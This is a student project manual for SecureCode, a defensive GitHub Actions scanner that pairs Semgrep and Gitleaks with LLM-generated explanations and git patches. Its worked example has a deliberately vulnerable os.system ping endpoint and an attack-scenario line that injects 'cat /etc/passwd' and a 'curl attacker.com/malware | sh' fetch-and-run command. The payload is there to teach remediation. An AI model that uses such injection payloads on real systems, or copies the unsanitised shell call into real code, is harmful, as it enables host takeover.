# SecureCode: Comprehensive Technical Project Manual
**Autonomous Zero-Hosting DevSecOps Security Scanner and AI Remediation Platform**

---

## Authors and Project Contributors
* **Shlok Garg** (PRN: 24070122187) - CI/CD Composite Action, SARIF v2.1.0 Integration & GitHub UI Lead
* **Shashank Tai** (PRN: 24070122181) - Static Analysis Core, Rule Engineering & Secret Detection Lead
* **Sayantan Nandi** (PRN: 24070122176) - Hybrid AI Remediation Engine, Privacy Redaction & Git Patch Lead

---

## Table of Contents
1. Executive Overview and Core Purpose
2. Problem Statement: Why Existing SAST Tools Fail
3. Complete Technology Stack and Architectural Rationale
4. System Architecture and End-to-End Execution Flow
5. Detailed Module-by-Module Technical Breakdown
6. The Remediation Lifecycle: From Bug Detection to One-Click Patch
7. Advantages and Engineering Innovations
8. Limitations, Disadvantages, and Technical Trade-Offs
9. Practical Usage and Deployment Guide
10. Team Work Distribution and Component Ownership
11. Conclusion and Future Roadmap

---

## 1. Executive Overview and Core Purpose

SecureCode is an automated application security and code remediation platform engineered to bridge the gap between static code security analysis and developer productivity. 

In traditional software development, security is frequently treated as an afterthought—audited manually right before a production release or flagged by legacy scanners that dump thousands of lines of cryptic error codes into build logs. Developers are told that their code is vulnerable, but they are rarely given an intuitive explanation of the risk, an explanation of how an attacker could exploit it, or a verified code fix.

SecureCode solves this by operating directly inside the continuous integration pipeline as an autonomous GitHub Action. Every time a developer pushes code or opens a pull request, SecureCode:
1. Performs Abstract Syntax Tree (AST) static code analysis to detect software flaws (such as command injection, path traversal, and unsafe deserialization).
2. Scans files and commit history for exposed credentials, tokens, and private API keys using entropy and pattern analysis.
3. Cleans, deduplicates, and strips file path clutter from the raw results.
4. Redacts sensitive credentials through a privacy shield before constructing AI prompts.
5. Queries high-speed Language Processing Units (LPUs) on Groq to generate plain-English risk explanations, realistic hacker attack scenarios, and accurate code diffs.
6. Compiles all verified fixes into a single downloadable `remediation.patch` file that developers can apply instantly using `git apply`.
7. Exports standard OASIS SARIF v2.1.0 diagnostics directly to GitHub's native Security tab and formats an executive summary dashboard on the GitHub Actions build page.

Most importantly, SecureCode operates with **zero persistent hosting costs ($0 cloud bill)**. It runs entirely inside ephemeral GitHub Actions container runners, eliminating the need for expensive dedicated servers.

---

## 2. Problem Statement: Why Existing SAST Tools Fail

The philosophy of "Shift-Left Security" advocates testing for vulnerabilities as early as possible in the software development lifecycle. However, widespread adoption of Shift-Left tools has stalled due to four critical industry pain points:

### 2.1 Prohibitive Hosting and Infrastructure Costs
Legacy Static Application Security Testing (SAST) tools such as SonarQube, Veracode, and Checkmarx require persistent server infrastructure. Teams must deploy, maintain, and pay for 24/7 virtual machines, background worker daemons, and relational databases (PostgreSQL or MySQL). For individual developers, open-source contributors, students, and early-stage startups, paying $50 to $200+ per month just to run code scans is economically unfeasible.

### 2.2 Incomprehensible Error Codes and Developer Alert Fatigue
Traditional scanners output cryptic rule identifiers such as `CWE-78: Improper Neutralization of Special Elements used in an OS Command` or `B301: pickle`. These alerts are buried inside thousands of lines of raw build console text. Developers are alerted that a problem exists, but they are not given context:
* Why is this specific line dangerous?
* What input could a real hacker provide to exploit this?
* How does this affect the application's overall security posture?

This lack of clarity causes alert fatigue, leading developers to ignore warnings or disable security checks entirely.

### 2.3 The Remediation Gap: Finding Problems vs. Fixing Them
Traditional scanners stop at identification. They dump a list of failures on the developer's desk and walk away. The developer must spend hours researching security documentation, reading StackOverflow, and drafting custom patches. No major platform provides an automated, pre-computed Git patch that can be reviewed and applied with a single terminal command.

### 2.4 Confidentiality Risks with Public AI Services
To understand security alerts, many developers currently copy vulnerable code snippets into commercial AI chatbots (e.g., ChatGPT). However, source code often contains hardcoded API keys, database credentials, internal endpoints, and proprietary business logic. Transmitting raw code to third-party cloud models without prior sanitization violates enterprise compliance standards, leaks confidential secrets, and introduces severe data breach liabilities.

---

## 3. Complete Technology Stack and Architectural Rationale

SecureCode was engineered using modern, modular technologies chosen specifically for execution speed, zero-infrastructure footprint, and strict data privacy.

| Layer | Technology | Specific Version / Library | Purpose in SecureCode | Why This Technology Was Chosen |
| :--- | :--- | :--- | :--- | :--- |
| **Execution Environment** | GitHub Actions | Composite Action Runtime | Pipeline Orchestration | Runs inside ephemeral build runners with zero hosting cost ($0 infrastructure). |
| **Primary Language** | Python | Python 3.11+ | Backend, CLI, and Core Engines | Native ecosystem support for AST parsing, security tooling, and AI SDKs. |
| **Static Code Analysis** | Semgrep | `semgrep >= 1.65.0` | Semantic Code Vulnerability Detection | Uses Abstract Syntax Trees (AST) to understand code logic and data flow, minimizing false positives compared to regex. |
| **Secret Detection** | Gitleaks | Gitleaks v8.18.2 (Standalone Linux x64) | Credential and Token Hunting | High-speed compiled Go binary combining Shannon entropy calculations with regex pattern matching. |
| **AI Inference Engine** | Groq LPU Cloud | Groq SDK (`groq >= 0.5.0`) | High-Speed AI Explanation & Diff Generation | Language Processing Unit (LPU) architecture delivers sub-1.5s inference for deep reasoning models. |
| **Primary AI Models** | OpenAI Open-Weight | `openai/gpt-oss-120b`, `openai/gpt-oss-20b` | Structured JSON Security Remediation | 131,072 token context window allows full file understanding; highly capable at syntax-accurate code diffs. |
| **Alternative AI Providers** | Google GenAI / AWS | `google-genai >= 0.1.1`, `boto3 >= 1.34.0` | Secondary Cloud AI Fallback | Provides redundant AI connectivity if Groq credentials are not available. |
| **Data Validation** | Pydantic | `pydantic >= 2.6.0`, `pydantic-settings` | Strict Type Validation and Schema Enforcement | Validates all finding models, severity enums, and JSON outputs with zero runtime schema errors. |
| **Reporting Standard** | OASIS SARIF | SARIF v2.1.0 Standard | Native GitHub Security Tab Integration | Industry standard for static analysis diagnostics; natively renders code scanning alerts in GitHub. |
| **Patch Engine** | Unified Diff Specification | POSIX Unified Diff Format | Automated Git Remediation Patch | Compatible out-of-the-box with `git apply` without requiring third-party patching utilities. |
| **Web REST API** | FastAPI | `fastapi >= 0.110.0`, `uvicorn` | Local Web Application and ZIP Uploads | Asynchronous, lightweight REST server for manual repository scanning outside of CI. |
| **Web Frontend** | Next.js / React | Next.js 14, React 18, TailwindCSS | Web Dashboard and Visual Diff Inspector | Provides an interactive graphical interface with side-by-side split diff views. |

---

## 4. System Architecture and End-to-End Execution Flow

SecureCode is structured around an autonomous six-stage data transformation pipeline:

```
[Developer Repository]
         |
         | (git push / pull_request event)
         v
[Stage 1: Ephemeral Container Initialization]
  - Provisions Ubuntu 22.04/24.04 runner
  - Configures Python 3.11 runtime
  - Downloads standalone Gitleaks binary
  - Installs lightweight Python dependencies
         |
         v
[Stage 2: Parallel Dual-Engine Static Analysis]
  - Semgrep AST evaluates semantic code patterns in backend/rules
  - Gitleaks evaluates git buffer and files for high-entropy secrets
  - Bypasses vendor clutter (node_modules, venv, .git)
         |
         v
[Stage 3: Normalization and Deduplication Pipeline]
  - Strips runner system paths (clean_rule_id_and_title)
  - Computes stable SHA-256 fingerprint for each finding
  - Maps standardized severity weights (Critical, High, Medium, Low)
         |
         v
[Stage 4: Privacy Shield and Context Slicing]
  - Extracts 25 surrounding lines of source code (+/- 12 lines)
  - Regex sanitization intercepts and redacts credentials: [REDACTED_KEY]
         |
         v
[Stage 5: Hybrid AI Remediation Engine]
  - Formats strict JSON-schema prompt
  - Primary: Queries Groq LPU (openai/gpt-oss-120b)
  - Fault Tolerance: Cascades to alternative models upon TPM rate limits
  - Air-Gap Safety: Falls back to local deterministic knowledge base
         |
         v
[Stage 6: Multi-Artifact Dispatch and Policy Enforcement]
  - Writes visual markdown dashboard to $GITHUB_STEP_SUMMARY
  - Writes OASIS SARIF v2.1.0 report with artifactChanges to results.sarif
  - Compiles all diff chunks into remediation.patch
  - Evaluates fail-on policy threshold and sets workflow exit code
```

---

## 5. Detailed Module-by-Module Technical Breakdown

### 5.1 The Composite Action Definition (`action.yml`)
The entry point for continuous integration is `action.yml`. Configured as a GitHub composite action, it abstracts all underlying complexity away from the user. 
* **Zero-Docker Overhead:** Rather than spinning up a heavy Docker container (which adds 2 to 3 minutes of image pulling overhead), it executes directly on the native runner environment using Bash steps.
* **Deterministic Environment Setup:** It installs Python 3.11, curls and unpacks the standalone Gitleaks binary into `/usr/local/bin`, and caches pip dependencies.
* **Resilient Parameter Mapping:** It safely accepts configuration parameters (`fail-on`, `enable-ai`, `groq-api-key`, `groq-model`, `patch-output`, `sarif-output`) and maps them to environment variables with fallback preservation.

### 5.2 The Scanner Orchestration and CLI (`backend/app/scan.py`)
`scan.py` serves as the primary controller for both CI/CD execution and local terminal usage:
* **Dynamic Python Path Resolution:** When invoked inside a caller repository, the working directory is the caller's repository, not SecureCode's directory. `scan.py` dynamically computes its own parent directory and prepends it to `sys.path`, preventing `ModuleNotFoundError` across repositories.
* **Source Context Extraction:** For every finding flagged by the scanners, `scan.py` reads the actual target file from disk and slices a 25-line context window surrounding the vulnerable line. This ensures the AI understands local function scopes and variable definitions.
* **Guaranteed Artifact Generation:** `scan.py` executes file exports (SARIF report and patch file) *before* evaluating the build failure threshold. If critical vulnerabilities cause the action to fail, the SARIF report and Git patch are already safely written to disk.
* **Policy Threshold Enforcement:** Evaluates findings against the user's `fail-on` setting (`critical`, `high`, `medium`, `low`, `none`) and returns an appropriate process exit code (1 for policy failure, 0 for pass).

### 5.3 Semgrep AST Analysis Engine (`backend/app/engine/semgrep.py`)
Semgrep evaluates source code against Abstract Syntax Trees:
* **Semantic Analysis vs. Text Search:** Regex scanners look for literal string patterns. Semgrep parses code into AST nodes, enabling it to recognize when untrusted input flows into a sink even if the variable has been renamed, reassigned, or passed through intermediary functions.
* **Directory Exclusion Logic:** Enforces exclusions for `node_modules`, `venv`, `.venv`, `.git`, `dist`, and `build`, ensuring scans remain fast and noise-free.
* **Custom Security Rule Packs:** Loads bundled, curated security rules from `backend/rules/` targeting Python vulnerabilities:
  * `python-command-injection-os-system`: Detects string formatting inside `os.system` and `subprocess(shell=True)`.
  * `python-insecure-deserialization-pickle`: Detects arbitrary bytecode execution via `pickle.loads()`.
  * `python-insecure-eval`: Detects dangerous dynamic code evaluation via `eval()` and `exec()`.
  * `python-path-traversal-open`: Detects arbitrary file reads where user-controlled paths are opened without canonical boundary validation.

### 5.4 Gitleaks Secret Detection Engine (`backend/app/engine/gitleaks.py`)
Hardcoded secrets represent an immediate threat to infrastructure:
* **Dual-Method Detection:** Gitleaks combines regex signatures with Shannon entropy calculations. Shannon entropy measures the information density and randomness of a string; cryptographic keys, database passwords, and private tokens exhibit high entropy compared to normal English words.
* **Process Isolation:** Invokes the standalone Gitleaks binary with `shell=False` to prevent command injection, writing output directly to temporary JSON files that are immediately scrubbed after parsing.
* **Pattern Coverage:** Detects Stripe API keys, AWS Access Keys, GitHub Personal Access Tokens, Slack Webhook URLs, Private RSA/OpenSSH Keys, and JWT tokens.

### 5.5 Finding Normalization and Deduplication (`backend/app/engine/normalizer.py`)
Disparate security scanners produce inconsistent outputs. The normalizer provides structural uniformity:
* **Path Prefix Stripping (`clean_rule_id_and_title`):** Semgrep prepends the runner's full absolute path to rule IDs. The normalizer strips this directory bloat, mapping raw IDs to clean titles (e.g., `Command Injection via Shell (os.system)`).
* **SHA-256 Content Fingerprinting:** Generates a deterministic hash from `rule_id`, `normalized_file_path`, and `evidence_snippet`. This allows SecureCode to track findings across multiple commits and eliminate duplicate alerts.
* **Severity Normalization:** Maps diverse scanner ratings into a unified 5-tier enum: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFORMATIONAL`.

### 5.6 Automated Privacy Redaction Shield (`backend/app/ai/explainer_enhanced.py`)
SecureCode enforces strict data privacy before communicating with external AI providers:
* **Pre-Prompt Sanitization (`redact_secrets_enhanced`):** Scans the code snippet and surrounding context using multi-pattern regex filters.
* **Token Replacement:** Identified secrets are replaced with safe placeholders (e.g., `[REDACTED_STRIPE_KEY]`, `[REDACTED_AWS_KEY]`, `[REDACTED_PASSWORD]`). Real credentials never leave the runner container.

### 5.7 Hybrid AI Remediation Engine (`backend/app/ai/explainer_enhanced.py`)
The remediation engine provides actionable risk analysis and code diffs:
* **High-Speed Groq LPU Inference:** Connects to Groq's Language Processing Units. By default, it targets `openai/gpt-oss-120b` (featuring a 131,072 token context window), which completes complex security code analysis in approximately 1.2 seconds.
* **Strict JSON Response Schema:** The LLM is instructed via system prompts to return valid JSON matching specific keys: `plain_explanation`, `why_it_matters`, `attack_scenario`, `recommended_fix`, `original_code`, `corrected_code`, and `diff_unified`.
* **Autonomous Multi-Model Fallback Cascade:** If Groq's API encounters rate limits (Tokens-Per-Minute restrictions on free-tier keys) or model unavailability, the engine automatically cascades through alternative models:
  1. `openai/gpt-oss-120b` (Primary high-reasoning model)
  2. `openai/gpt-oss-20b` (Fast, high-throughput model)
  3. `openai/gpt-oss-safeguard-20b` (Ultra-low latency model)
  4. `allam-2-7b` (Alternative verified model)
* **Offline Deterministic Fallback:** In air-gapped environments or if all external APIs are unreachable, the engine falls back to its internal deterministic knowledge base. Pre-computed, verified code diffs for standard CWEs are generated locally, guaranteeing that the CI pipeline never crashes.

### 5.8 OASIS SARIF v2.1.0 Exporter (`backend/app/engine/sarif_exporter.py`)
SARIF is the standard interchange format for static analysis tools:
* **Strict Schema Compliance:** Generates valid SARIF v2.1.0 JSON compatible with GitHub's CodeQL Action.
* **The `artifactChanges` Fix:** Earlier versions of SARIF parsers rejected files containing `fileChanges` inside fix blocks. SecureCode strictly implements the OASIS `artifactChanges` specification with character-accurate `deletedRegion` and `insertedContent` blocks.
* **Native Security Alerts:** Uploading this SARIF file directly lights up alerts in the repository's native GitHub **Security -> Code scanning alerts** interface.

### 5.9 Unified Git Patch Generator (`backend/app/engine/patch_generator.py`)
Rather than expecting developers to manually copy and paste code fixes from a dashboard:
* **Compilation of Diffs:** Aggregates all AI-generated unified diffs across all affected files.
* **Standard POSIX Git Headers:** Formats file headers (`--- a/file`, `+++ b/file`) and hunk coordinates (`@@ -start,len +start,len @@`).
* **Artifact Delivery:** Saves the output as `remediation.patch`, enabling instant remediation via `git apply remediation.patch`.

### 5.10 Groq Model Diagnostic Utility (`check_groq_models.py`)
A standalone CLI utility engineered to troubleshoot AI model availability:
* **Account Introspection:** Connects to Groq using the user's API key and calls `client.models.list()`.
* **Live Latency Benchmarking:** Sends a lightweight security test prompt to all candidate models on the user's specific account tier, validating JSON output and measuring response latency in milliseconds.
* **Configuration Guidance:** Recommends the highest-performing active model and prints the exact configuration needed for `.env` and GitHub Actions workflow files.

---

## 6. The Remediation Lifecycle: From Bug Detection to One-Click Patch

To understand the practical power of SecureCode, consider a real-world scenario where a developer accidentally commits vulnerable code in a web application (`app.py`):

```python
# Vulnerable code committed to repository:
@app.route("/api/ping")
def ping_host():
    host = request.args.get("ip")
    os.system(f"ping -c 1 {host}")  # Command Injection Vulnerability!
    return {"status": "pinged"}
```

### Stage 1: Detection
During the `git push` event, Semgrep's AST engine flags line 5. It recognizes that `host` originates from an untrusted source (`request.args.get`) and flows directly into an operating system execution sink (`os.system`).

### Stage 2: Normalization and Context Slicing
The normalizer catches the finding and labels it `Command Injection via Shell (os.system)`. SecureCode reads `app.py` from disk, pulling 12 lines above and below line 5 so the AI has full visibility into variable definitions and imports.

### Stage 3: AI Analysis and Diff Construction
The privacy shield verifies no secrets are present, and the prompt is sent to Groq LPU (`openai/gpt-oss-120b`). In 1.2 seconds, the model responds with structured JSON:
* **Plain Explanation:** "User-controlled input is passed directly to the operating system shell execution function without sanitization."
* **Attack Scenario:** "An attacker passes `127.0.0.1; cat /etc/passwd` or `127.0.0.1 && curl attacker.com/malware | sh` to hijack the host server."
* **Recommended Fix:** "Use `subprocess.run` with an explicit list of command arguments and ensure `shell=False` is enforced."
* **Unified Diff:**
  ```diff
  --- a/app.py
  +++ b/app.py
  @@ -4,3 +4,3 @@
  -    os.system(f"ping -c 1 {host}")
  +    subprocess.run(["ping", "-c", "1", host], capture_output=True, shell=False)
  ```

### Stage 4: One-Click Remediation
SecureCode compiles this diff into `remediation.patch`. The developer sees the alert on GitHub, downloads the patch artifact, and runs:
```bash
git apply remediation.patch
git commit -am "fix: apply automated security remediation patch from SecureCode"
git push origin main
```
The codebase is remediated in seconds with zero manual coding.

---

## 7. Advantages and Engineering Innovations

1. **True Zero-Hosting Footprint ($0 Infrastructure Cost):**  
   Runs entirely inside GitHub Actions ephemeral container runners. There are no virtual machines to manage, no databases to patch, and no monthly cloud hosting bills.
2. **Actionable Git Patches Instead of Manual Homework:**  
   Traditional tools only point out mistakes. SecureCode writes the fix and packages it as a standard Git patch file (`git apply remediation.patch`).
3. **Human-Centric Risk Explanations:**  
   Replaces cryptic CWE codes with plain-English summaries and realistic attack scenarios that educate developers on how adversaries exploit vulnerabilities.
4. **Privacy-First AI Architecture:**  
   Multi-pattern regex redaction ensures passwords, tokens, and private API keys are stripped before code snippets leave the runner container.
5. **Ultra-Fast Scan Execution (~27 Seconds Total):**  
   By bypassing Docker container startup overhead and pairing compiled Go binaries with Groq LPUs, scans complete in under 30 seconds.
6. **Native GitHub Ecosystem Integration:**  
   Outputs full OASIS SARIF v2.1.0 reports directly into GitHub's native Security tab and renders rich markdown summaries on the Actions dashboard.
7. **Resilient Multi-Model and Offline Fallbacks:**  
   If an AI provider experiences rate-limiting or downtime, SecureCode cascades through alternative models or falls back to an offline deterministic database, ensuring CI pipelines never halt unexpectedly.

---

## 8. Limitations, Disadvantages, and Technical Trade-Offs

A rigorous engineering evaluation requires acknowledging operational limitations and architectural trade-offs:

1. **Static Analysis Inherent Blind Spots (No Dynamic Execution):**  
   As a Static Application Security Testing (SAST) tool, SecureCode inspects source code without running it. It cannot detect dynamic runtime vulnerabilities that only manifest during execution (such as race conditions, memory leaks, or network firewall misconfigurations that require Dynamic Application Security Testing, or DAST).
2. **AI Rate Limits on Free-Tier API Keys:**  
   Cloud AI providers (such as Groq) enforce Tokens-Per-Minute (TPM) quotas on free-tier accounts. While SecureCode's multi-model fallback cascade mitigates this, very large repositories with dozens of simultaneous findings may temporarily exhaust free quotas and fall back to the deterministic engine.
3. **Current Language Focus:**  
   The core rule set and context extractors are currently optimized for Python applications. While Semgrep and Gitleaks natively support multiple languages, automated AI diff generation for languages with complex build steps (e.g., C++, Java, Rust) requires additional language-specific AST rule packs.
4. **Dependence on GitHub Actions Runtime:**  
   The zero-hosting design relies on GitHub Actions. While the CLI (`scan.py`) can be executed locally or adapted to GitLab CI/Bitbucket Pipelines, the native composite action is tightly integrated with GitHub's runner architecture.

---

## 9. Practical Usage and Deployment Guide

### 9.1 Adding SecureCode to a GitHub Repository
To integrate SecureCode into any repository, create `.github/workflows/securecode.yml`:

```yaml
name: SecureCode Security Analysis

on:
  push:
    branches: [ "main", "master" ]
  pull_request:
    branches: [ "main", "master" ]

permissions:
  contents: read
  security-events: write

jobs:
  security-scan:
    name: SecureCode Analysis & Remediation
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Run SecureCode Scanner
        uses: ShlokGarg22/SecureCode@main
        with:
          fail-on: "high"
          enable-ai: "true"
          groq-api-key: ${{ secrets.GROQ_API_KEY }}

      - name: Upload SARIF to GitHub Security Tab
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        continue-on-error: true
        with:
          sarif_file: results.sarif

      - name: Archive Remediation Patch
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: remediation-patch
          path: remediation.patch
          if-no-files-found: ignore
```

### 9.2 Running Locally via CLI
To scan a local folder without GitHub Actions:
```bash
# Navigate to SecureCode repository root:
python backend/app/scan.py --path /path/to/project --enable-ai --fail-on high --patch-output remediation.patch --sarif-output results.sarif
```

### 9.3 Diagnosing Available Groq Models
To check which AI models are accessible on your specific Groq API key:
```bash
python check_groq_models.py --key "YOUR_GROQ_API_KEY"
```

---

## 10. Team Work Distribution and Component Ownership

SecureCode was designed, developed, and tested through equal collaboration among three computer engineering students:

### 10.1 Shlok Garg (PRN: 24070122187)
* **Role:** CI/CD Automation, GitHub Actions Architecture & SARIF Integration Lead
* **Key Deliverables:**
  * Engineered the composite GitHub Action definition (`action.yml`) with automated Gitleaks binary compilation and sub-15-second setup.
  * Authored the OASIS SARIF v2.1.0 generator (`sarif_exporter.py`), implementing the strict `artifactChanges` replacement structure for native GitHub Code Scanning compatibility.
  * Designed CI threshold policy evaluation (`fail-on`) and bash return-code trapping in `scan.py`.
  * Formatted the responsive GitHub Actions Step Summary markdown dashboard with auto-expanding High/Critical cards.
  * Deployed and maintained the public integration testbed repository (`ShlokGarg22/TestingSecureCode`).

### 10.2 Shashank Tai (PRN: 24070122181)
* **Role:** Static Analysis Core, Rule Engineering & Secret Detection Lead
* **Key Deliverables:**
  * Developed the process execution wrapper for Semgrep (`semgrep.py`), managing AST rule resolution and directory exclusion logic (`node_modules`, `venv`).
  * Engineered the standalone Gitleaks secret detection runner (`gitleaks.py`) with process isolation (`shell=False`) and structured JSON report parsing.
  * Authored and curated custom AST security rules in `backend/rules/` targeting OS command injection, pickle deserialization, path traversal, and dangerous `eval()` execution.
  * Built the finding normalizer (`normalizer.py`), implementing `clean_rule_id_and_title()` and SHA-256 fingerprinting for deduplication.
  * Formulated the CWE severity classification and risk weighting algorithm.

### 10.3 Sayantan Nandi (PRN: 24070122176)
* **Role:** Hybrid AI Remediation Engine, Privacy Redaction & Git Patch Lead
* **Key Deliverables:**
  * Architected the dual AI engine (`explainer_enhanced.py`) combining Groq LPU inference (`openai/gpt-oss-120b`, `openai/gpt-oss-20b`) with an offline deterministic knowledge base fallback.
  * Designed the fault-tolerant model cascade that dynamically shifts across alternative Groq models during TPM rate limits.
  * Engineered the regex-based privacy redaction filter (`redact_secrets_enhanced`) that sanitizes code snippets prior to cloud prompt construction.
  * Implemented the unified Git patch generator (`patch_generator.py`) that compiles AI diffs into `remediation.patch`.
  * Authored the Groq model diagnostic utility (`check_groq_models.py`) for live latency and JSON schema validation.
  * Co-developed the FastAPI REST backend and Next.js web application for manual ZIP file scanning.

---

## 11. Conclusion and Future Roadmap

SecureCode demonstrates that enterprise-grade application security does not require expensive server infrastructure, complex database configurations, or frustrating developer workflows. By uniting AST static code analysis, high-entropy secret detection, privacy-preserving credential redaction, and high-speed Groq LPU inference, SecureCode delivers automated security reviews and actionable Git patches directly where developers already work.

### Future Roadmap
1. **Multi-Language Expansion:** Broaden bundled AST rule packs to cover JavaScript/TypeScript, Go, Java, and C#.
2. **Automated Pull Request Bot:** Build a GitHub App bot to automatically create branch pull requests containing the applied remediation patch, allowing developers to review and merge fixes with a single button click.
3. **IDE Extension:** Port the deterministic and AI remediation engines into a VS Code extension for real-time inline warnings before code is committed.
